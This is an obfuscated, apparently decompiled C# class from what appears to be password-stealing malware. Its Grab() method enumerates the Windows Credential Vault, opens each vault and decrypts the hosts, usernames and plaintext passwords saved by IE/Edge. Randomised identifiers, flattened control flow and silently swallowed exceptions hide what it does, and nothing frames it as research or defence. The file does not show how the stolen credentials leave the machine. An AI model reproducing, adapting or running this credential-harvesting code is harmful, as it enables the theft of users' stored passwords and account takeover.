using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using p3N5Y;
using ppkr;

namespace ZAZUx;

public class T9t : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string _3vDvqrED
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public T9t()
	{
		_3vDvqrED = "IE/Edge";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					Version version = Environment.OSVersion.Version;
					int major = version.Major;
					int minor = version.Minor;
					Type type = ((major < 6 || minor < 2) ? typeof(gVe3wBP.EFrFq) : typeof(gVe3wBP._06ZbC));
					int vaultCount = 0;
					IntPtr vaultGuid = IntPtr.Zero;
					int value = gVe3wBP.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuid);
					if (Convert.ToInt32(value) != 0)
					{
						return list;
					}
					IntPtr ptr = vaultGuid;
					Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
					dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
					dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
					dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
					dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
					dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
					dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
					dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
					dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
					dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
					Dictionary<Guid, string> dictionary2 = dictionary;
					for (int i = 0; i <= vaultCount - 1; i++)
					{
						object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
						Guid vaultGuid2 = new Guid(obj.ToString());
						ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
						IntPtr vaultHandle = IntPtr.Zero;
						if (dictionary2.ContainsKey(vaultGuid2))
						{
							_ = dictionary2[vaultGuid2];
						}
						else
						{
							vaultGuid2.ToString();
						}
						if (gVe3wBP.VaultOpenVault(ref vaultGuid2, 0u, ref vaultHandle) != 0)
						{
							continue;
						}
						int vaultItemCount = 0;
						IntPtr vaultItem = IntPtr.Zero;
						value = gVe3wBP.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItem);
						if (value != 0)
						{
							continue;
						}
						IntPtr ptr2 = vaultItem;
						if (vaultItemCount <= 0)
						{
							continue;
						}
						for (int j = 1; j <= vaultItemCount; j++)
						{
							try
							{
								object obj2 = Marshal.PtrToStructure(ptr2, type);
								ptr2 = ((IntPtr.Size != 8) ? new IntPtr(ptr2.ToInt32() + Marshal.SizeOf(type) - 8) : new IntPtr(ptr2.ToInt64() + Marshal.SizeOf(type)));
								IntPtr passwordVaultPtr = IntPtr.Zero;
								FieldInfo field = obj2.GetType().GetField("SchemaId");
								Guid schemaId = new Guid(field.GetValue(obj2).ToString());
								FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
								IntPtr intPtr = (IntPtr)field2.GetValue(obj2);
								FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
								IntPtr intPtr2 = (IntPtr)field3.GetValue(obj2);
								IntPtr intPtr3 = IntPtr.Zero;
								if (major >= 6 && minor >= 2)
								{
									FieldInfo field4 = obj2.GetType().GetField("pPackageSid");
									intPtr3 = (IntPtr)field4.GetValue(obj2);
									value = gVe3wBP.VaultGetItem_WIN8(vaultHandle, ref schemaId, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref passwordVaultPtr);
								}
								if (value == 0)
								{
									object obj3 = Marshal.PtrToStructure(passwordVaultPtr, type);
									FieldInfo field5 = obj3.GetType().GetField("pAuthenticatorElement");
									IntPtr bXGeD = (IntPtr)field5.GetValue(obj3);
									if (intPtr3 != IntPtr.Zero && intPtr3 != default(IntPtr))
									{
										gVe3wBP.LcWKH6Lg(intPtr3);
									}
									string host = (string)gVe3wBP.LcWKH6Lg(intPtr);
									string username = (string)gVe3wBP.LcWKH6Lg(intPtr2);
									string password = (string)gVe3wBP.LcWKH6Lg(bXGeD);
									list.Add(new ii68
									{
										byIdLuuGZbL = host,
										S8v = username,
										_9H5rP7hg2 = password,
										oVAe = "IE/Edge"
									});
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
				return list;
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}
}
